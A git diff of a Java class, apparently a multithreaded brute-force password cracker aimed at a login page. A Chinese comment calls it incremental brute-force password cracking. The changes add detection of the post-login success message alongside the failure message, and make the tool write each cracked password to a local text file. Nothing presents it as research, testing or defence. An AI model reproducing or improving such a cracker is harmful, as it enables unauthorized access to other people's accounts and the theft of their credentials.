@@ -22,6 +22,7 @@ public class ShanghaiOppoPost {
 
 
     static String defeated = "错误的用户名或密码！";
+    static String success = "请选择功能:";
 
     /**
      * 递增暴力破译密码
@@ -67,19 +68,19 @@ public class ShanghaiOppoPost {
             if (isDefeated) {
                 System.out.println(pwd);
                 count += threadNum;
-            } else {
+            } else if (fonts.stream().anyMatch(f -> f.toString().contains(success))){
                 // 成功试出密码
-                break;
+                success(pwd);
             }
         }
-        success(pwd);
+
 
     }
 
     private void success(String p) {
         try {
             System.out.println("!!!!!!!!!!!!!!!!!!" + p);
-            File file = new File("F:\\MyTest\\pc\\src\\main\\resources\\txt\\pwd.txt");
+            File file = new File("C:\\Users\\lsy\\IdeaProjects\\pc\\src\\main\\resources\\txt\\pwd2.txt");
             file.exists();
             BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(file));
             bufferedWriter.write(p);
